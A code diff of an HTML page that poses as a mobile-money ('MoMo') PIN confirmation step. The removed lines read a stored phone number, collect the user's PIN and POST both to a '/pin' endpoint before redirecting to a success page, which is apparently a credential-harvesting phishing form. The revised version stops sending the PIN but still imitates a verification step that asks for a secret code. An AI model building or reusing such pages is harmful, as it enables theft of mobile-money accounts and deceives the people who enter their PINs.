@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MoMo PIN</title>
+<title>MoMo Step</title>
 
 <style>
 body {
@@ -43,7 +43,6 @@ input {
   background: #f1f1f1;
   text-align: center;
   font-size: 18px;
-  letter-spacing: 5px;
 }
 
 /* BUTTON */
@@ -72,13 +71,13 @@ button {
 </div>
 
 <div class="container">
-  <h3>Enter MoMo PIN</h3>
+  <h3>Confirm Your Details</h3>
 
   <p id="phoneDisplay"></p>
 
   <form id="pinForm">
-    <input type="password" name="pin" placeholder="****" maxlength="5" required>
-    <button type="submit">Confirm</button>
+    <input type="password" placeholder="Enter Code" required>
+    <button type="submit">Continue</button>
   </form>
 </div>
 
@@ -87,33 +86,23 @@ button {
 </div>
 
 <script>
-// ✅ GET PHONE FROM STORAGE
+// ✅ GET DATA
 const phone = localStorage.getItem("phone");
+
+// ✅ IF NO DATA → GO BACK
+if (!phone) {
+  window.location.href = "/";
+}
 
 // SHOW PHONE
 document.getElementById("phoneDisplay").innerText = "Number: " + phone;
 
-// SEND PIN
-document.getElementById("pinForm").addEventListener("submit", async function(e) {
+// HANDLE SUBMIT (NO SENSITIVE DATA SENT)
+document.getElementById("pinForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
-  const pin = this.pin.value;
-
-  try {
-    await fetch("/pin", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ phone, pin })
-    });
-
-    // 👉 MOVE TO SUCCESS PAGE
-    window.location.href = "/success.html";
-
-  } catch (err) {
-    alert("Error");
-  }
+  // 👉 DIRECT TO SUCCESS PAGE
+  window.location.href = "/success.html";
 });
 </script>
 
